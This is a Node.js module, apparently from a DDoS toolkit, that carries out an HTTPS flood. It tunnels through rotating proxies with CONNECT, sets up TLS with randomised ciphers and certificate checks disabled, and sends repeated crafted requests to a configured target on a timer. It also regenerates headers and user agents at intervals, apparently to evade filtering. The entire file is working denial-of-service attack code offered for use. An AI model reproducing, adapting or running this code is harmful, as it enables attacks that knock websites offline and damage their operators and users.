const http = require('http')
const tls = require('tls')
const header = require('../header')
const proxy = require('../proxy')
const ua = require('../ua')


module.exports = (config) => {
    const cplist = [
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
    ]

    let data, cipper = null;

    // 更新数据
    const updateData = () => {
        data = header.make({
            url: config.url,
            host: config.urls.host,
            ua: ua.make(),
            post: config.post,
            post_length: config.post.length 
        })
        data = header.random(data, config.randomlength)
        cipper = cplist[Math.floor(Math.random() * cplist.length)]
    }

    // 首次更新
    updateData()

    // 定时更新
    setInterval(updateData, config.random)

    // 执行脚本
    setInterval(() => {
        const proxyer = proxy.make()
        const request = http.request({
            host: proxyer[0],
            port: proxyer[1],
            ciphers: cipper,
            method: 'CONNECT',
            path: config.urls.host + ":443",
            timeout: config.timeout
        }, (err) => {
            request.end()
        });

        request.on('connect', (res, socket, head) => {
            const tlsConnection = tls.connect({
                host: config.urls.host,
                ciphers: cipper,
                secureProtocol: 'TLSv1_2_method',
                servername: config.urls.host,
                secure: true,
                rejectUnauthorized: false,
                socket
            }, () => {
                for (let i = 0; i < config.rate; i++) {
                    tlsConnection.write(data)
                }
            });

            tlsConnection.on('error', () => {
                tlsConnection.end()
                tlsConnection.destroy()
            })

            tlsConnection.on('data', () => {
                //console.log(data)
            })
        })

        request.on('error', (err) => {
        })

        request.end()
    }, config.speed)
}
